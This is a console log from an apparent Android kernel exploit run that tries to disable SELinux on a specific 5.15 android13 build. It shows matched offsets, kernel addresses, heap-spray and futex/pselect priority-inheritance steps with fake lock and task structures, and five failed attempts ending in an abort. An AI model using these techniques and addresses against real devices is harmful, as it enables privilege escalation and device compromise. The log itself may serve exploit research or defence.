[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
[32m[+] [0mstartup context pid=6243 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[32m[+] [0mstartup limits pid=6243 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=6243 label=ghostlock_nevada slide=pselect main=pselect
[32m[+] [0mp0 profile pid=6243 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
[33m[*] [0m[T+0ms] exploit start
[33m[*] [0m[T+1530ms] pre-W1 drain
[33m[*] [0mWrite 1 attempt 1/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+1530ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[11440..15637] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+23576ms]   heap spray done
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=4 page=ffffff8025970000 fake_lock=ffffff8025970000 fake_w0=ffffff8025970300 fake_task=ffffff8025970400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8025970400 ex3=ffffff8025970000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +203ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+24796ms]   PI route done
[33m[*] [0mWrite 1 attempt 2/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+24897ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[10255..13680] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+35434ms]   heap spray done
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=4 page=ffffff80f3718000 fake_lock=ffffff80f3718000 fake_w0=ffffff80f3718300 fake_task=ffffff80f3718400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff80f3718400 ex3=ffffff80f3718000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +203ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+36673ms]   PI route done
[33m[*] [0mWrite 1 attempt 3/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+36773ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[17336..19817] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+51287ms]   heap spray done
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=4 page=ffffff80f9820000 fake_lock=ffffff80f9820000 fake_w0=ffffff80f9820300 fake_task=ffffff80f9820400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff80f9820400 ex3=ffffff80f9820000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +205ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+52526ms]   PI route done
[33m[*] [0mWrite 1 attempt 4/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+52627ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[23736..26209] slowest_rejected=7
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+75995ms]   heap spray done
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=4 page=ffffff800e6f8000 fake_lock=ffffff800e6f8000 fake_w0=ffffff800e6f8300 fake_task=ffffff800e6f8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff800e6f8400 ex3=ffffff800e6f8000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +202ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+77205ms]   PI route done
[33m[*] [0mWrite 1 attempt 5/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+77305ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[10098..14322] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+110414ms]   heap spray done
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=4 page=ffffff800eb80000 fake_lock=ffffff800eb80000 fake_w0=ffffff800eb80300 fake_task=ffffff800eb80400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff800eb80400 ex3=ffffff800eb80000
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +202ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+111651ms]   PI route done
[31m[!] [0mWrite 1 failed
[!] ghostlock preload verdict: ABORTED -- see the last [!] line
